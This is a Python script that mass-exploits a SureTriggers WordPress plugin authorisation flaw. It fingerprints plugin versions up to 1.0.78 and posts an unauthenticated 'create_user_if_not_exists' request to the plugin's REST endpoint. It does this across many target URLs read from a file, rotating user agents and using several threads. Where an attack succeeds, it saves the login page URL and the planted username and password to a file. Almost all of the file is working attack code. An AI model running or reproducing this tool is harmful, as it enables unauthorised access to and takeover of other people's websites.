import argparse
import requests
import json
import re
import threading
import random

requests.packages.urllib3.disable_warnings()

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
]

DEFAULT_EMAIL = "gmail"
DEFAULT_USERNAME = "username"
DEFAULT_PASSWORD = "password"

def fetch_plugin_version(target_url):
    try:
        readme_url = f"{target_url.rstrip('/')}/wp-content/plugins/suretriggers/readme.txt"
        response = requests.get(readme_url, timeout=10, verify=False)
        if response.status_code == 200:
            match = re.search(r"Stable tag:\s*(\d+\.\d+\.\d+)", response.text)
            if match:
                return match.group(1)
        return None
    except Exception:
        return None

def is_version_vulnerable(version):
    try:
        version_parts = list(map(int, version.split(".")))
        return version_parts <= [1, 0, 78]
    except Exception:
        return False

def wp_login_exists(target_url):
    try:
        wp_login_url = f"{target_url.rstrip('/')}/wp-login.php"
        response = requests.get(wp_login_url, timeout=10, verify=False)

        # Jika status code 200, lanjutkan pengecekan
        if response.status_code == 200:
            # Pastikan halaman berisi form login asli
            if 'name="log"' in response.text and 'name="pwd"' in response.text and 'wp-submit' in response.text:
                # Jika ada elemen modal atau jenis login lainnya, tandakan sebagai login tidak sah
                if any(keyword in response.text for keyword in ["#loginmodal", "#oauth-login", "API Authentication", "Authorization"]):
                    print(f"[-] {target_url} - Invalid login type detected (modal or API auth), skipping save.")
                    return False
                return True
        return False
    except Exception as e:
        print(f"[-] {target_url} - Error: {e}")
        return False

def check_wp_login(target_url, username, password):
    login_url = f"{target_url.rstrip('/')}/wp-login.php"
    payload = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'testcookie': '1'
    }
    response = requests.post(login_url, data=payload, timeout=10, verify=False, allow_redirects=False)
    return response.status_code == 302

def prepare_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Content-Type": "application/json",
        "st_authorization": ""
    }

def build_payload(email, username, password):
    return {
        "integration": "WordPress",
        "type_event": "create_user_if_not_exists",
        "selected_options": {
            "user_email": email,
            "user_name": username,
            "password": password
        },
        "fields": [],
        "context": {}
    }

def send_exploit_request(endpoint, headers, payload):
    try:
        return requests.post(endpoint, headers=headers, json=payload, timeout=15, verify=False)
    except:
        return None

def handle_response(response, url, username, password):
    if not response:
        print(f"[-] {url} - No response.")
        return
    try:
        response_data = response.json()
        if response_data.get("success"):
            print(f"[+] {url} - Exploit successful! {username}:{password}")
            # Cek apakah wp-login.php valid sebelum menyimpan
            login_url = f"{url.rstrip('/')}/wp-login.php"
            if wp_login_exists(url):
                with open("vulnerable.txt", "a") as f:
                    f.write(f"{login_url} | {username}:{password}\n")
            else:
                print(f"[-] {url} - wp-login.php not valid, skipping save.")
        else:
            print(f"[-] {url} - Exploit failed.")
    except Exception as e:
        print(f"[-] {url} - Failed to parse response. Error: {e}")

def clean_url(url):
    if not url.startswith("http"):
        return "http://" + url
    return url.strip()

def exploit_target(target_url, email, username, password):
    target_url = clean_url(target_url)
    version = fetch_plugin_version(target_url)

    if version and is_version_vulnerable(version):
        print(f"[+] {target_url} - Vulnerable v{version} detected.")
        headers = prepare_headers()
        payload = build_payload(email, username, password)
        endpoint = f"{target_url.rstrip('/')}/wp-json/sure-triggers/v1/automation/action"
        response = send_exploit_request(endpoint, headers, payload)
        handle_response(response, target_url, username, password)
    elif version:
        print(f"[-] {target_url} - Version {version} not vulnerable.")
    else:
        print(f"[~] {target_url} - Could not determine version.")

def main(target_urls, threads):
    with open(target_urls, 'r') as file:
        urls = file.readlines()

    def worker(url):
        exploit_target(url.strip(), DEFAULT_EMAIL, DEFAULT_USERNAME, DEFAULT_PASSWORD)

    thread_list = []
    for url in urls:
        thread = threading.Thread(target=worker, args=(url.strip(),))
        thread_list.append(thread)
        thread.start()
        if len(thread_list) >= threads:
            for t in thread_list:
                t.join()
            thread_list = []

    for t in thread_list:
        t.join()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit SureTriggers Plugin")
    parser.add_argument("-l", "--target_urls", required=True, help="File containing target URLs")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads to use")
    args = parser.parse_args()

    main(args.target_urls, args.threads)
